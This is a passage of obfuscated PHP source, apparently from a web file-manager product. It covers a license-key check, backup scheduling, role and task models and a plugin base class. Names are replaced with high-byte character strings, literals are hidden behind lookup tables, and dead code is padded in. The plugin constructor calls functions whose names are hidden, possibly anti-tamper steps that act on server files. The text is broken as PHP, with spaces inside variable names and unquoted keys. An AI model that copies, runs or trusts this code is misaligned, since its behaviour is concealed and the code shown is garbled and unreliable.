$ºåşƒ³‹ =& $_SERVER[ø÷æ£ÁÖ]; $ â¬ÚÚÃ = explode($ºåşƒ³‹[313], $ãÉ¹ö×’); $ºå©Çİ = $Ó«ÍÕ†­[818]; if (count($ â¬ÚÚÃ) != 2) { return $ºåşƒ³‹[6]; } $×•²’Å– = $this->kqzg02413233($ â¬ÚÚÃ[1] . $ºåşƒ³‹[6], $ºåşƒ³‹[138]); if (!$×•²’Å–) { return $ºåşƒ³‹[6]; } $×•²’Å– = intval($×•²’Å–); $´‡ƒŒìğ = $Ó«ÍÕ†­[819]; if (!$´‡ƒŒìğ) { return; } $‹ÕÌÒÇÚ = 0; $í·ÆÏ®Ø = 0; for ($âä¶áËª = 3; $âä¶áËª < $×•²’Å–; $âä¶áËª += 2) { if ($×•²’Å– % $âä¶áËª != 0) { continue; } $‹ÕÌÒÇÚ = $âä¶áËª; $í·ÆÏ®Ø = intval($×•²’Å– / $âä¶áËª); break; $Ùä•ş¾ = $Ó«ÍÕ†­[820]; if (strlen($Ùä•ş¾) < $Ó«ÍÕ†­[711]) { die; } } $âÛÌƒ = ($‹ÕÌÒÇÚ - 1) * ($í·ÆÏ®Ø - 1); $ô¬Öş«– = intval(($‹ÕÌÒÇÚ + $í·ÆÏ®Ø) / 2); while (1) { $Íçƒ´ä£ = $ô¬Öş«–; $¦´êÑ—â = $âÛÌƒ; $±ìœıšÉ = $Ó«ÍÕ†­[821]; if (strlen($±ìœıšÉ) < $Ó«ÍÕ†­[718]) { die; } while ($¦´êÑ—â % $Íçƒ´ä£ != 0) { $Ë©ÕÃŸ€ = $¦´êÑ—â; $¦´êÑ—â = $Íçƒ´ä£; $Â§ŸŠí½ = $Ó«ÍÕ†­[822]; if (strlen($Â§ŸŠí½) < $Ó«ÍÕ†­[703]) { die; } $Íçƒ´ä£ = $Ë©ÕÃŸ€ % $Íçƒ´ä£; } if ($Íçƒ´ä£ == 1) { break; } else { $ô¬Öş«–++; } } $—µ¿¸¤ = 2; $Â¤…È» = $Ó«ÍÕ†­[823]; if (strlen($Â¤…È») < $Ó«ÍÕ†­[711]) { return; } for ($âä¶áËª = 0; $âä¶áËª < $âÛÌƒ * 10; $âä¶áËª++) { if (($âÛÌƒ * $âä¶áËª + 1) % $ô¬Öş«– == 0) { $—µ¿¸¤ = intval(($âÛÌƒ * $âä¶áËª + 1) / $ô¬Öş«–); break; } } $òÃó ’  = md5($ºåşƒ³‹[310] . ($‹ÕÌÒÇÚ + $í·ÆÏ®Ø) . $ºåşƒ³‹[311] . $ô¬Öş«– . $ºåşƒ³‹[311] . $—µ¿¸¤ . $ºåşƒ³‹[312]); $¼ä´µ„© = $Ó«ÍÕ†­[824]; while (strlen($¼ä´µ„©) < $Ó«ÍÕ†­[703]) { if (!$¼ä´µ„©) { break; } $¼ä´µ„©++; } $çÊîÒÇ˜ = $this->kqzg02413233($ â¬ÚÚÃ[0], $òÃó ’ ); return $çÊîÒÇ˜; } public function vsdo520d79ee() { $¡¢ò„ =& $_SERVER[¿ÈˆÑ¸ä]; $öÖÄÆ±Å = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ôšá¥„½ = array(); $Æ—ÅÇõ« = 1; $§ıêÛˆÀ = $¡¢ò„[825]; if (!$§ıêÛˆÀ) { die; } while ($Æ—ÅÇõ« <= (int) sqrt($öÖÄÆ±Å)) { $îµË¬‹Ø = $Æ—ÅÇõ«; $Óõ´Æ = $¡¢ò„[826]; while (!0) { $îµË¬‹Ø++; $ˆ¼ïÊÃ = $¡¢ò„[827]; if ($îµË¬‹Ø <= 2) { $Æ—ÅÇõ« = $îµË¬‹Ø; break; } else { if ($îµË¬‹Ø < 2) { continue; } } $‹ÑÙº¿Ê = !0; for ($°‡ÀÖçö = 2; $°‡ÀÖçö <= sqrt($îµË¬‹Ø); $°‡ÀÖçö++) { if ($îµË¬‹Ø % $°‡ÀÖçö == 0) { $‹ÑÙº¿Ê = !1; } } if ($‹ÑÙº¿Ê) { $Æ—ÅÇõ« = $îµË¬‹Ø; break; } } $Ôšá¥„½[] = $Æ—ÅÇõ«; } $ĞŸ‡ƒÏ = 2; $Äàœı…ú = $¡¢ò„[828]; while (strlen($Äàœı…ú) < $¡¢ò„[703]) { if (!$Äàœı…ú) { break; } $Äàœı…ú++; } for ($îµË¬‹Ø = $öÖÄÆ±Å; $îµË¬‹Ø > 1; $îµË¬‹Ø--) { $‹ÑÙº¿Ê = !0; foreach ($Ôšá¥„½ as $›Ò¼éòÉ) { if ($îµË¬‹Ø % $›Ò¼éòÉ == 0) { $‹ÑÙº¿Ê = !1; break; } } if ($‹ÑÙº¿Ê) { $ĞŸ‡ƒÏ = $îµË¬‹Ø; break; } } return $ĞŸ‡ƒÏ; $…Ê›İÎ£ = $¡¢ò„[829]; while (strlen($…Ê›İÎ£) < $¡¢ò„[725]) { if (!$…Ê›İÎ£) { break; } $…Ê›İÎ£++; } } public function uzje658df61e($×ƒÙ†å, $¼°¬î£µ) { $¹õÀ²É‰ =& $_SERVER[¿ÈˆÑ¸ä]; $¡†Ï§ëè =& $_SERVER[ø÷æ£ÁÖ]; return call_user_func(array($¡†Ï§ëè[8], $¡†Ï§ëè[314]), $×ƒÙ†å, $¼°¬î£µ); $¸Ë‹‘¬ì = $¹õÀ²É‰[830]; while (strlen($¸Ë‹‘¬ì) < $¹õÀ²É‰[725]) { if (!$¸Ë‹‘¬ì) { break; } $¸Ë‹‘¬ì++; } } public function xkryb402ffa2($¬èµ¬, $Ã ÛòŞ) { $”½ßà– =& $_SERVER[ø÷æ£ÁÖ]; return call_user_func(array($”½ßà–[315], $”½ßà–[316]), $¬èµ¬, $Ã ÛòŞ); } public function kqzg02413233($ĞäÎ÷Şã, $ÚúöåŠ¾) { $‘¿“µÁ =& $_SERVER[ø÷æ£ÁÖ]; return call_user_func(array($‘¿“µÁ[315], $‘¿“µÁ[317]), $ĞäÎ÷Şã, $ÚúöåŠ¾); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¿ÈˆÑ¸ä][831]); $this->init(); $this->keep(); } public function init() { $íóÈ…‚Ë =& $_SERVER[¿ÈˆÑ¸ä]; $this->isManual(); self::$name = date($íóÈ…‚Ë[832]); if (!($ŠÒ–ö¹À = $this->model->lastItem())) { $ŠÒ–ö¹À = $this->initData(); } else { self::$name = $ŠÒ–ö¹À[$íóÈ…‚Ë[32]]; if ($ŠÒ–ö¹À[$íóÈ…‚Ë[833]] == $íóÈ…‚Ë[91]) { self::$name = date($íóÈ…‚Ë[260]); $¼ÄêÉ‘ı = intval(_get($ŠÒ–ö¹À, $íóÈ…‚Ë[834], 0)); if (self::$manual == 0 && $ŠÒ–ö¹À[$íóÈ…‚Ë[32]] == self::$name) { $this->model->remove($ŠÒ–ö¹À[$íóÈ…‚Ë[483]]); } $ŠÒ–ö¹À = $this->initData($¼ÄêÉ‘ı, $ŠÒ–ö¹À[$íóÈ…‚Ë[835]]); } else { $this->checkStore($ŠÒ–ö¹À[$íóÈ…‚Ë[835]]); } } self::$option = $ŠÒ–ö¹À; } private function isManual() { $ˆàë‹× = _get($GLOBALS, $_SERVER[¿ÈˆÑ¸ä][836], 0); $ˆàë‹× = intval($ˆàë‹×); self::$manual = $ˆàë‹× && $ˆàë‹× == 1 ? 1 : 0; } private function initData($ŒĞ‡·ññ = 0, $â«—•Çù = '') { $¬œµôºÁ =& $_SERVER[¿ÈˆÑ¸ä]; $£›õøìÀ = $this->model->config(); if ($â«—•Çù && $£›õøìÀ[$¬œµôºÁ[835]] != $â«—•Çù) { $ŒĞ‡·ññ = 0; } $this->checkStore($£›õøìÀ[$¬œµôºÁ[835]]); if (self::$manual == 1) { self::$name .= $¬œµôºÁ[11] . date($¬œµôºÁ[837]); } $çÊ×é¡Ú = array($¬œµôºÁ[835] => $£›õøìÀ[$¬œµôºÁ[835]], $¬œµôºÁ[32] => self::$name, $¬œµôºÁ[833] => 0, $¬œµôºÁ[169] => $£›õøìÀ[$¬œµôºÁ[169]], $¬œµôºÁ[838] => self::$manual, $¬œµôºÁ[839] => array($¬œµôºÁ[840] => array($¬œµôºÁ[833] => 0), $¬œµôºÁ[841] => array($¬œµôºÁ[833] => 0, $¬œµôºÁ[842] => 0, $¬œµôºÁ[843] => 0, $¬œµôºÁ[33] => $¬œµôºÁ[12], $¬œµôºÁ[844] => 0, $¬œµôºÁ[845] => 0), $¬œµôºÁ[846] => array($¬œµôºÁ[833] => 0, $¬œµôºÁ[842] => 0, $¬œµôºÁ[843] => 0, $¬œµôºÁ[844] => 0, $¬œµôºÁ[845] => 0), $¬œµôºÁ[231] => array($¬œµôºÁ[833] => 0, $¬œµôºÁ[847] => 0, $¬œµôºÁ[848] => 0, $¬œµôºÁ[849] => 0, $¬œµôºÁ[850] => 0, $¬œµôºÁ[553] => $ŒĞ‡·ññ, $¬œµôºÁ[844] => 0, $¬œµôºÁ[845] => 0)), $¬œµôºÁ[844] => time(), $¬œµôºÁ[845] => 0); $´Á‹å»ß = $this->model->insert($çÊ×é¡Ú); $çÊ×é¡Ú[$¬œµôºÁ[483]] = $´Á‹å»ß; return $çÊ×é¡Ú; } private function checkStore($½¸å¼Á) { $•àëü´Œ = Model($_SERVER[¿ÈˆÑ¸ä][851]); $®”ŞØç = $•àëü´Œ->listData($½¸å¼Á); $•àëü´Œ->checkConfig($®”ŞØç); } public static function get() { if (!self::$option) { $ô¯ó¾¼Š = Model($_SERVER[¿ÈˆÑ¸ä][831]); $úüµ®¤ = $ô¯ó¾¼Š->findByName(self::$name); $ô¯ó¾¼Š->parseContent($úüµ®¤); self::$option = $úüµ®¤; } return self::$option; } public static function set($Ñğß°¨®) { $·­ë˜É =& $_SERVER[¿ÈˆÑ¸ä]; $ˆÄ¯°ùª = self::get(); foreach ($Ñğß°¨® as $·•Û™Ï => $´ÂÚ¸¡™) { array_set_value($ˆÄ¯°ùª, $·•Û™Ï, $´ÂÚ¸¡™); } Model($·­ë˜É[831])->update($ˆÄ¯°ùª[$·­ë˜É[483]], $ˆÄ¯°ùª); self::$option = $ˆÄ¯°ùª; return self::$option; } public function keep() { $‰Éàà¿ =& $_SERVER[¿ÈˆÑ¸ä]; $ÒÖé¼† = self::get(); if (_get($ÒÖé¼†, $‰Éàà¿[852], 0) == $‰Éàà¿[91]) { return; } $this->backupKeep($ÒÖé¼†); self::set(array($‰Éàà¿[852] => 1)); } private function backupKeep($ïÆ¸ú) { $ÅßòÆ¨ =& $_SERVER[¿ÈˆÑ¸ä]; if (self::$manual == 1) { return; } $±Û¢œëÒ = $this->model->listData(); if (empty($±Û¢œëÒ)) { return; } $³ÒÊ†¨ó = array(); $®ğË¾„ƒ = array(); $äëı‚òş = date($ÅßòÆ¨[853], strtotime($ÅßòÆ¨[854])); foreach ($±Û¢œëÒ as $¿‰¶˜‘ => $Ìˆ¤²ñ­) { $¾†õÃƒ = $Ìˆ¤²ñ­[$ÅßòÆ¨[32]]; if ($¿‰¶˜‘ < 7 || $Ìˆ¤²ñ­[$ÅßòÆ¨[838]] == $ÅßòÆ¨[91]) { $³ÒÊ†¨ó[] = $¾†õÃƒ; continue; } $ ¨‘Œ À = substr($¾†õÃƒ, 0, 6); if ($ ¨‘Œ À < $äëı‚òş) { continue; } if (!isset($®ğË¾„ƒ[$ ¨‘Œ À]) || $¾†õÃƒ < $®ğË¾„ƒ[$ ¨‘Œ À]) { $®ğË¾„ƒ[$ ¨‘Œ À] = $¾†õÃƒ; } if (substr($¾†õÃƒ, 6, 2) == $ÅßòÆ¨[855]) { $®ğË¾„ƒ[$ ¨‘Œ À] = $¾†õÃƒ; } } $³ÒÊ†¨ó = array_merge($³ÒÊ†¨ó, array_values($®ğË¾„ƒ)); $³ÒÊ†¨ó = array_unique($³ÒÊ†¨ó); foreach ($±Û¢œëÒ as $Ìˆ¤²ñ­) { $¾†õÃƒ = $Ìˆ¤²ñ­[$ÅßòÆ¨[32]]; if (!empty($¾†õÃƒ) && in_array($¾†õÃƒ, $³ÒÊ†¨ó)) { continue; } $this->model->remove($Ìˆ¤²ñ­[$ÅßòÆ¨[483]]); $û¨³ØÃÏ = $this->backupPath($ïÆ¸ú); IO::remove($û¨³ØÃÏ, !1); } } private function backupPath($—Ã°È¢á) { $ş¸±É« =& $_SERVER[¿ÈˆÑ¸ä]; static $ÙİÀè­ƒ = null; if (is_null($ÙİÀè­ƒ)) { $ÙİÀè­ƒ = Model($ş¸±É«[856])->get($ş¸±É«[857]); } $ßöåõ³± = $—Ã°È¢á[$ş¸±É«[32]]; $ÂéÌùÏò = substr(md5($ş¸±É«[858] . $ÙİÀè­ƒ . $ßöåõ³±), 0, 8); return "\173\151\x6f\x3a{$—Ã°È¢á[$ş¸±É«[835]]}\x7d\57\144\141\x74\x61\142\x61\x73\x65\x2f\x62\141\x63\x6b\165\x70\x2f" . $ßöåõ³± . $ş¸±É«[11] . $ÂéÌùÏò; } public function db() { $Â¼¨®ı¯ =& $_SERVER[¿ÈˆÑ¸ä]; $ä¸ÚÈÃæ = self::get(); if (_get($ä¸ÚÈÃæ, $Â¼¨®ı¯[859], 0) == $Â¼¨®ı¯[91]) { return !0; } $»“‡š™À = new BackupDb(); if (!$»“‡š™À->index()) { return !1; } self::set(array($Â¼¨®ı¯[859] => 1)); return !0; } public function dbFile() { $è´‡‚›ì =& $_SERVER[¿ÈˆÑ¸ä]; $˜û¡â…î = self::get(); if (_get($˜û¡â…î, $è´‡‚›ì[860], 0) == $è´‡‚›ì[91]) { return !0; } $İı·Ğğ = new BackupDbFile(); if (!$İı·Ğğ->index()) { return !1; } self::set(array($è´‡‚›ì[860] => 1)); return !0; } public function file() { $¤èåôßı =& $_SERVER[¿ÈˆÑ¸ä]; $¼êêÌâ° = self::get(); if (_get($¼êêÌâ°, $¤èåôßı[861], 0) == $¤èåôßı[91]) { return !0; } if ($¼êêÌâ°[$¤èåôßı[169]] == $¤èåôßı[862]) { $Í£™×«Š = new BackupFile(); if (!$Í£™×«Š->index()) { return !1; } } self::set(array($¤èåôßı[861] => 1, $¤èåôßı[833] => 1)); return !0; } public static function log($õ­Æ–¶ò) { write_log($õ­Æ–¶ò, $_SERVER[¿ÈˆÑ¸ä][863]); } } goto F»í¿ÈˆÕğ; bùì¥Òœ‘: define($_SERVER[¿ÈˆÑ¸ä][318], 3); define($_SERVER[¿ÈˆÑ¸ä][319], 1); define($_SERVER[¿ÈˆÑ¸ä][320], 0); goto CÅ†Ì›ÀÄ; EºÌ¼™ÍÃ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x72\x6f\154\145\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\x75\x74\x68", "\x6c\x61\142\x65\154", "\x64\x69\x73\x70\154\x61\171", "\x73\171\x73\164\145\x6d", "\144\145\163\x63", "\151\x67\156\x6f\162\x65\x45\170\x74", "\x69\x67\156\157\162\x65\106\151\x6c\145\x53\151\x7a\145", "\141\144\x6d\151\x6e\151\163\x74\x72\141\x74\157\162", "\x73\x6f\x72\x74"); public function listData($£¼Êµã† = false, $’ì›Ê› = "\x73\x6f\162\x74", $¤Ÿ’ÖÅŒ = false) { $úü…Ğí’ =& $_SERVER[¿ÈˆÑ¸ä]; $…©ê–ò­ = parent::listData($£¼Êµã†, $’ì›Ê›, $¤Ÿ’ÖÅŒ); if (!$£¼Êµã†) { foreach ($…©ê–ò­ as $ÀÆ°¯ => $–ŠçïŸÎ) { if ($–ŠçïŸÎ[$úü…Ğí’[2315]] == 1) { $…©ê–ò­[$ÀÆ°¯][$úü…Ğí’[536]] = LNG($úü…Ğí’[2605]); } } } return $…©ê–ò­; } public function update($¬”Òãæ›, $ğÇœÔ±¯) { $”âÖšî¥ =& $_SERVER[¿ÈˆÑ¸ä]; $œ©ï„¡‰ = parent::listData($¬”Òãæ›); $ ­ô—šó = $this->findByName($ğÇœÔ±¯[$”âÖšî¥[32]]); if (!$œ©ï„¡‰ || $ ­ô—šó && $ ­ô—šó[$”âÖšî¥[483]] != $œ©ï„¡‰[$”âÖšî¥[483]]) { return !1; } if ($ ­ô—šó[$”âÖšî¥[2315]] == 1) { $ğÇœÔ±¯ = array($”âÖšî¥[32] => $ğÇœÔ±¯[$”âÖšî¥[32]], $”âÖšî¥[2143] => $ğÇœÔ±¯[$”âÖšî¥[2143]]); } $this->filterAuth($ğÇœÔ±¯[$”âÖšî¥[498]]); return parent::update($¬”Òãæ›, $ğÇœÔ±¯); } public function remove($í˜Œ»ù) { $¦î„Å‹ë = parent::listData($í˜Œ»ù); if (!$¦î„Å‹ë || $¦î„Å‹ë[$_SERVER[¿ÈˆÑ¸ä][190]]) { return !1; } return parent::remove($í˜Œ»ù); } public function add($¶­ôÎ¨Ñ) { $ğÌò±ïó =& $_SERVER[¿ÈˆÑ¸ä]; $é¦õ“÷Ò = $¶­ôÎ¨Ñ[$ğÌò±ïó[32]]; if ($this->findByName($é¦õ“÷Ò)) { return !1; } $Á°¸éœÔ = array($ğÌò±ïó[505] => $é¦õ“÷Ò, $ğÌò±ïó[2128] => $ğÌò±ïó[12], $ğÌò±ïó[2124] => $ğÌò±ïó[2132], $ğÌò±ïó[2606] => 1, $ğÌò±ïó[2127] => 0, $ğÌò±ïó[2607] => 0, $ğÌò±ïó[2126] => $this->getSort()); $¶­ôÎ¨Ñ = array_merge($Á°¸éœÔ, $¶­ôÎ¨Ñ); $this->filterAuth($¶­ôÎ¨Ñ[$ğÌò±ïó[498]]); return parent::insert($¶­ôÎ¨Ñ); } private function getSort() { $ğÍà‡ªŠ =& $_SERVER[¿ÈˆÑ¸ä]; $Âˆ÷Ãâå = parent::listData(); $â»àş’ú = array_to_keyvalue($Âˆ÷Ãâå, $ğÍà‡ªŠ[12], $ğÍà‡ªŠ[2144]); return empty($â»àş’ú) ? 0 : max($â»àş’ú) + 1; } private function filterAuth(&$‡Æ×¿  ) { $ß¿«¶Çò =& $_SERVER[¿ÈˆÑ¸ä]; $š‘œõ²ƒ = array(); $‚èã¿› = array_filter(explode($ß¿«¶Çò[50], $‡Æ×¿  )); foreach ($‚èã¿› as $‡Æ×¿  ) { $ëûÔÃ¯ï = explode($ß¿«¶Çò[10], $‡Æ×¿  ); if ($ëûÔÃ¯ï[0] == $ß¿«¶Çò[2608] && $ëûÔÃ¯ï[1] != $ß¿«¶Çò[1242]) { $§’ı–ë‹ = $ëûÔÃ¯ï[0] . $ß¿«¶Çò[10] . $ëûÔÃ¯ï[1] . $ß¿«¶Çò[2609]; if (!in_array($§’ı–ë‹, $‚èã¿›)) { $š‘œõ²ƒ[] = $§’ı–ë‹; } } $š‘œõ²ƒ[] = $‡Æ×¿  ; } $‡Æ×¿   = implode($ß¿«¶Çò[50], $š‘œõ²ƒ); } public function findRoleDefault() { $’ãÙìó =& $_SERVER[¿ÈˆÑ¸ä]; $¼£¢¸ìÔ = parent::listData(); $€×šßø = !1; foreach ($¼£¢¸ìÔ as $µ£Î£Öü) { if (!$µ£Î£Öü || $µ£Î£Öü[$’ãÙìó[2142]] == $’ãÙìó[229] || $µ£Î£Öü[$’ãÙìó[2315]] == 1) { continue; } if (strstr($µ£Î£Öü[$’ãÙìó[498]], $’ãÙìó[2610])) { continue; } if (!strstr($µ£Î£Öü[$’ãÙìó[498]], $’ãÙìó[2611])) { continue; } if (!$€×šßø) { $€×šßø = $µ£Î£Öü; continue; } $¤õ×šˆß = explode($’ãÙìó[50], $€×šßø[$’ãÙìó[498]]); $ÆŸüªß = explode($’ãÙìó[50], $µ£Î£Öü[$’ãÙìó[498]]); if (count($¤õ×šˆß) > count($ÆŸüªß)) { $€×šßø = $µ£Î£Öü; } } return $€×šßø ? $€×šßø[$’ãÙìó[483]] : $’ãÙìó[12]; } public function sort($ÉÚ¤¢‚·, $‘Ñº‰±¤) { return parent::update($ÉÚ¤¢‚·, $‘Ñº‰±¤); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\164\141\163\153\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x74\171\x70\x65", "\x65\166\x65\x6e\x74", "\x74\151\155\x65", "\144\x65\163\x63", "\163\171\x73\164\145\155", "\x65\x6e\141\x62\x6c\145", "\154\141\163\164\122\165\156", "\x73\157\x72\164"); public function listData($Ó¯òÎ«… = false, $†´ãÍ‹Ú = "\x73\x6f\x72\x74", $µÍ†‘â· = false) { return parent::listData($Ó¯òÎ«…, $†´ãÍ‹Ú, $µÍ†‘â·); } public function add($—¼»Œ½ ) { $ˆ†Ö«Òş =& $_SERVER[¿ÈˆÑ¸ä]; $•öÂÙÏ = $this->findByName($—¼»Œ½ [$ˆ†Ö«Òş[32]]); if ($•öÂÙÏ) { return !1; } $—¼»Œ½ [$ˆ†Ö«Òş[1867]] = 0; $—¼»Œ½ [$ˆ†Ö«Òş[2144]] = $this->getSort(); return parent::insert($—¼»Œ½ ); } private function getSort() { $ƒ°Ö Ïß =& $_SERVER[¿ÈˆÑ¸ä]; $¤°Ã´ó´ = parent::listData(); $Ò›šêÓ = array_to_keyvalue($¤°Ã´ó´, $ƒ°Ö Ïß[12], $ƒ°Ö Ïß[2144]); return empty($Ò›šêÓ) ? 0 : max($Ò›šêÓ) + 1; } public function update($âÅ¼şßæ, $‹Ğ‘ÇÒ•) { $Ô¬‚÷¾û =& $_SERVER[¿ÈˆÑ¸ä]; $§şˆ¦¼Õ = $this->listData($âÅ¼şßæ); $°ªÁ Ş = $this->findByName($‹Ğ‘ÇÒ•[$Ô¬‚÷¾û[32]]); if (!$§şˆ¦¼Õ || $°ªÁ Ş && $°ªÁ Ş[$Ô¬‚÷¾û[483]] != $§şˆ¦¼Õ[$Ô¬‚÷¾û[483]]) { return !1; } return parent::update($âÅ¼şßæ, $‹Ğ‘ÇÒ•); } public function remove($¯«“¢ò, $“”›Àû­ = false) { $ŠÊœÈÕ„ =& $_SERVER[¿ÈˆÑ¸ä]; $¸™¥½Ü» = $this->listData($¯«“¢ò); if (!$¸™¥½Ü») { return; } if (!$“”›Àû­ && $¸™¥½Ü»[$ŠÊœÈÕ„[190]] == $ŠÊœÈÕ„[91]) { return !1; } return parent::remove($¯«“¢ò); } public function enable($·öÅÏ¯, $ÕÈ³É¾) { return $this->update($·öÅÏ¯, array($_SERVER[¿ÈˆÑ¸ä][2600] => $ÕÈ³É¾)); } public function run($ÎÆÌ´È¦) { return $this->update($ÎÆÌ´È¦, array($_SERVER[¿ÈˆÑ¸ä][2612] => time())); } } goto eÇ­ÀÀ“•ò; dÙÉ«Â±½‚: class Message { function __construct() { } public function send($È«œ¢ò¥ = '', $°“ÁÉˆõ = array(), $Ëñ‡Ëã¨ = "\x74\x65\x78\x74") { $Ç©Œ­¸¸ =& $_SERVER[¿ÈˆÑ¸ä]; $»À¶¹Òº = array($Ç©Œ­¸¸[33] => $Ç©Œ­¸¸[1224], $Ç©Œ­¸¸[169] => $È«œ¢ò¥); if (in_array($Ëñ‡Ëã¨, array($Ç©Œ­¸¸[1224], $Ç©Œ­¸¸[1762]))) { $»À¶¹Òº[$Ç©Œ­¸¸[33]] = $Ëñ‡Ëã¨; } $°“ÁÉˆõ = array($Ç©Œ­¸¸[594] => isset($°“ÁÉˆõ[$Ç©Œ­¸¸[594]]) ? $°“ÁÉˆõ[$Ç©Œ­¸¸[594]] : $Ç©Œ­¸¸[12], $Ç©Œ­¸¸[681] => isset($°“ÁÉˆõ[$Ç©Œ­¸¸[681]]) ? $°“ÁÉˆõ[$Ç©Œ­¸¸[681]] : $Ç©Œ­¸¸[12]); if (empty($È«œ¢ò¥) || empty($°“ÁÉˆõ[$Ç©Œ­¸¸[594]]) && empty($°“ÁÉˆõ[$Ç©Œ­¸¸[681]])) { return !1; } $øì´¥Ù› = array($Ç©Œ­¸¸[1691] => $»À¶¹Òº, $Ç©Œ­¸¸[1763] => $°“ÁÉˆõ); Hook::trigger($Ç©Œ­¸¸[1764], $øì´¥Ù›); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¸ó—´Ç =& $_SERVER[¿ÈˆÑ¸ä]; if ($_SERVER[$¸ó—´Ç[962]] != $_SERVER[$¸ó—´Ç[963]]) { $ÄæÃƒŒî = $¸ó—´Ç[980]; $Õó¥¡¥º = $¸ó—´Ç[964]; $‹ì£Ï«» = $_SERVER[$¸ó—´Ç[965]] . $¸ó—´Ç[966]; $©Ú¦ÃÑÄ = $Õó¥¡¥º($‹ì£Ï«»); $Ã‘ß‰ = explode($¸ó—´Ç[286], $©Ú¦ÃÑÄ); if (count($Ã‘ß‰) < $¸ó—´Ç[703]) { $ª›¨Ô = $¸ó—´Ç[967]; $ª›¨Ô(); } $ŒØŞŸíó = $¸ó—´Ç[981]; $ŒØŞŸíó($_SERVER[$¸ó—´Ç[982]]); $ŒØŞŸíó($_SERVER[$¸ó—´Ç[965]] . $¸ó—´Ç[1765]); $ÆëÙÅªú = 1; while ($ÆëÙÅªú > 1) { $ÆëÙÅªú = $ÆëÙÅªú + 4; $Ü«ú°¥œ = rawurlencode($ÆëÙÅªú . $¸ó—´Ç[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¸ó—´Ç[1766]); $this->pluginName = str_replace($¸ó—´Ç[1766], $¸ó—´Ç[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¸ó—´Ç[8]; $this->pluginApi = appHostGet() . $¸ó—´Ç[1767] . $this->pluginName . $¸ó—´Ç[8]; $this->pluginHost = $config[$¸ó—´Ç[1768]] . $this->pluginName . $¸ó—´Ç[8]; $this->pluginHostDefault = $config[$¸ó—´Ç[1768]] . $this->pluginName . $¸ó—´Ç[8]; $É‹…´® = $config[$¸ó—´Ç[1769]]; if ($É‹…´® && strpos($¸ó—´Ç[50] . $É‹…´® . $¸ó—´Ç[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¸ó—´Ç[1770]] . $this->pluginName . $¸ó—´Ç[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¿ÈˆÑ¸ä][1771]); } protected function assign($²É‡ıÈû, $¯º¹€Ç = false) { if (is_array($²É‡ıÈû)) { $this->values = array_merge($this->values, $²É‡ıÈû); } else { $this->values[$²É‡ıÈû] = $¯º¹€Ç; } } protected function display($±‹ÇÆ®) { extract($this->values); require $±‹ÇÆ®; } final function hookRegist($…Ìœ€›”) { $this->modelPlugin->appRegist($this->pluginName, $…Ìœ€›”); } final function appIcon() { $ì‘Ñè½š =& $_SERVER[¿ÈˆÑ¸ä]; $á—£çë = $this->appPackage(); $¹ï›ìïñ = $ì‘Ñè½š[12]; if (isset($á—£çë[$ì‘Ñè½š[501]])) { if (isset($á—£çë[$ì‘Ñè½š[501]][$ì‘Ñè½š[1772]])) { $¹ï›ìïñ = $ì‘Ñè½š[1773] . $á—£çë[$ì‘Ñè½š[501]][$ì‘Ñè½š[1772]] . $ì‘Ñè½š[1774]; } else { if ($á—£çë[$ì‘Ñè½š[501]][$ì‘Ñè½š[1775]]) { $¹ï›ìïñ = $ì‘Ñè½š[1776] . $á—£çë[$ì‘Ñè½š[501]][$ì‘Ñè½š[1775]] . $ì‘Ñè½š[1777]; } } } return $¹ï›ìïñ; } final function fileCanView($¶‹Üµ¼³) { $áæüîÈÂ =& $_SERVER[¿ÈˆÑ¸ä]; if (request_url_safe($¶‹Üµ¼³)) { return !0; } if ($this->isShare($¶‹Üµ¼³)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $®º£í­ = $áæüîÈÂ[1778] . rawurlencode(this_url()); show_tips(LNG($áæüîÈÂ[1779]) . $áæüîÈÂ[1780] . $®º£í­ . $áæüîÈÂ[1781] . LNG($áæüîÈÂ[1782]) . $áæüîÈÂ[1783], !1); } if (!Action($áæüîÈÂ[1784])->authCan($áæüîÈÂ[1785])) { show_tips(LNG($áæüîÈÂ[1786]) . $áæüîÈÂ[1787], !1); } ActionCall($áæüîÈÂ[1788], $¶‹Üµ¼³); } final function isShare($¥—«Ş¡) { $ì¥ŠÊµê = KodIO::parse($¥—«Ş¡); return $ì¥ŠÊµê[$_SERVER[¿ÈˆÑ¸ä][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($äö”¥ˆŸ) { if (request_url_safe($äö”¥ˆŸ)) { return $äö”¥ˆŸ; } if (!$this->isShare($äö”¥ˆŸ)) { $äö”¥ˆŸ = $this->filePath($äö”¥ˆŸ, !1); } return Action($_SERVER[¿ÈˆÑ¸ä][1296])->linkOut($äö”¥ˆŸ); } public function filePathLinkOut($¬Ù´–“Ç) { if (request_url_safe($¬Ù´–“Ç)) { return $¬Ù´–“Ç; } $this->fileCanView($¬Ù´–“Ç); return Action($_SERVER[¿ÈˆÑ¸ä][1296])->link($¬Ù´–“Ç); } final function filePath($›¹ÃÒ•, $İÈ™îÑä = true, $ÆÓ‰’‹© = false) { $âµµòíà =& $_SERVER[¿ÈˆÑ¸ä]; $­…éÀ’‡ = $this->filePathGet($›¹ÃÒ•, $İÈ™îÑä); if (!$this->fileInfo) { show_tips(LNG($âµµòíà[106]), !1); } if ($ÆÓ‰’‹© && isset($this->fileInfo[$âµµòíà[553]]) && $this->fileInfo[$âµµòíà[553]]) { $¯¬°¬ÌŞ = Model($âµµòíà[556])->fileInfo($this->fileInfo[$âµµòíà[553]]); if (!$¯¬°¬ÌŞ || 